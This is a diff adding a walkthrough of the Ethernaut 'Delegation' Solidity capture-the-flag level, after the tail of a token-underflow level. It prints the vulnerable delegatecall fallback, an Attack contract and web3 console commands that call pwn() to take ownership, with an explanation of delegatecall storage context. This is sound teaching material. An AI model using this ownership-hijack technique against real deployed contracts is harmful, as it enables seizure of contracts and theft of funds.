@@ -128,3 +128,52 @@ Vulnerable Code:
 ```
 The `transfer` function is taking address whom we want to send token and `value` how much we want send but in 3rd line we can execute `Arithmetic Overflow and Underflow` by submiting 21 (As we have 20 TOKEN) So it will underflow the arithmetic function and add (2^256 - 1) this much token in our wallet
 
+
+
+# 6. [Challenge 6: Delegation](https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493)
+
+Tasks: 
+- The goal of this level is for you to claim ownership of the instance you are given.
+
+**Solution:** \
+Vulnerable Code:
+```
+  function pwn() public {
+    owner = msg.sender;
+  }
+```
+```
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+```
+
+Attack Payload:
+```
+contract Attack {
+    address public delegation;
+
+    constructor(address _delegation) public {
+        delegation = _delegation;
+    }
+
+    function attack() public {
+        delegation.call(abi.encodeWithSignature("pwn()"));
+    }
+}
+```
+To solve in command line:
+```
+var functionSignature = web3.utils.sha3("pwn()")
+contract.sendTransaction({data: functionSignature})
+```
+
+Eve called Attack.attack().
+Attack called the `fallback` function of `Delegation` sending the function selector of `pwn()`. `Delegation` forwards the call to `Delegate` using delegatecall.
+Here `msg.data` contains the function selector of `pwn()`.
+This tells Solidity to call the function `pwn()` inside `Delegate`.
+The function `pwn()` updates the owner to `msg.sender`.
+Delegatecall runs the code of `Delegate` using the context of `Delegation`.
+Therefore `Delegation`'s storage was updated to `msg.sender` where `msg.sender` is the caller of `Delegation`, in this case Attack.
